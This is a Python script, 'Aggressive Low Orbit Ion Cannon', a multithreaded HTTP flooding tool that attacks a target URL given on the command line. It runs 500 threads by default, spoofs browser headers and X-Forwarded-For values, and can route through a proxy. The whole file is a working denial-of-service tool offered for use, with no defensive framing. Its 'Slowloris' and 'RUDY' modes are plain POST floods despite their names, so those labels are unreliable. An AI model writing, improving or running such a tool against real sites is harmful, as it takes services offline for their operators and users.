import requests
import argparse
import random
import string
import threading
import queue

class AggressiveLOiC:
    def __init__(self, target_url, target_port=80, attack_mode='Aggressive', num_threads=500, proxy=None):
        self.target_url = target_url
        self.target_port = target_port
        self.attack_mode = attack_mode
        self.num_threads = num_threads
        self.proxy = proxy

        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        ]

        self.referrers = [
            'https://www.google.com/',
            'https://www.youtube.com/',
            'https://www.facebook.com/',
            'https://www.amazon.com/',
            'https://www.wikipedia.org/',
            'https://www.twitter.com/',
            'https://www.reddit.com/',
            'https://www.instagram.com/',
            'https://www.linkedin.com/',
            'https://www.microsoft.com/',
            'https://www.apple.com/'
        ]

        self.attack_functions = {
            'Aggressive': self.aggressive_attack,
            'Slowloris': self.slowloris_attack,
            'RUDY': self.rudy_attack
        }

        self.running = False

    def start(self):
        self.running = True

        # Start the attack threads
        for i in range(self.num_threads):
            t = threading.Thread(target=self.attack_functions[self.attack_mode])
            t.daemon = True
            t.start()

        # Wait for keyboard interrupt
        try:
            while True:
                pass
        except KeyboardInterrupt:
            self.running = False
            print('\nAttack stopped.')

    def generate_user_agent(self):
        return random.choice(self.user_agents)

    def generate_referrer(self):
        return random.choice(self.referrers)

    def generate_random_string(self, length):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

    def aggressive_attack(self):
        while self.running:
            try:
                headers = {
                    'User-Agent': self.generate_user_agent(),
                    'Referer': self.generate_referrer(),
                    'Cookie': self.generate_random_string(10) + '=' + self.generate_random_string(10),
                    'X-Forwarded-For': self.generate_random_string(10) + '.' + self.generate_random_string(10) + '.' + self.generate_random_string(10) + '.' + self.generate_random_string(10)
                }

                requests.get(self.target_url, headers=headers, proxies={'http': self.proxy, 'https': self.proxy}, timeout=5)
            except:
                pass

    def slowloris_attack(self):
        while self.running:
            try:
                headers = {
                    'User-Agent': self.generate_user_agent(),
                    'Referer': self.generate_referrer(),
                    'Cookie': self.generate_random_string(10) + '=' + self.generate_random_string(10),
                    'X-Forwarded-For': self.generate_random_string(10) + '.' + self.generate_random_string(10) + '.' + self.generate_random_string(10) + '.' + self.generate_random_string(10),
                    'Cache-Control': 'no-cache',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }

                requests.post(self.target_url, headers=headers, data=self.generate_random_string(10), proxies={'http': self.proxy, 'https': self.proxy}, timeout=5)
            except:
                pass

    def rudy_attack(self):
        while self.running:
            try:
                headers = {
                    'User-Agent': self.generate_user_agent(),
                    'Referer': self.generate_referrer(),
                    'Content-Type': 'application/x-www-form-urlencoded'
                }

                body = self.generate_random_string(10000)

                requests.post(self.target_url, headers=headers, data=body, proxies={'http': self.proxy, 'https': self.proxy}, timeout=5)
            except:
                pass



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Aggressive Low Orbit Ion Cannon')
    parser.add_argument('target_url', type=str, help='Target URL')
    parser.add_argument('--target_port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--attack_mode', choices=['Aggressive', 'Slowloris', 'RUDY'], default='Aggressive', help='Attack mode (default: Aggressive)')
    parser.add_argument('--num_threads', type=int, default=500, help='Number of attack threads (default: 500)')
    parser.add_argument('--proxy', type=str, default=None, help='Proxy URL (default: None)')

    args = parser.parse_args()

    aggressive_loic = AggressiveLOiC(args.target_url, args.target_port, args.attack_mode, args.num_threads, args.proxy)
    aggressive_loic.start()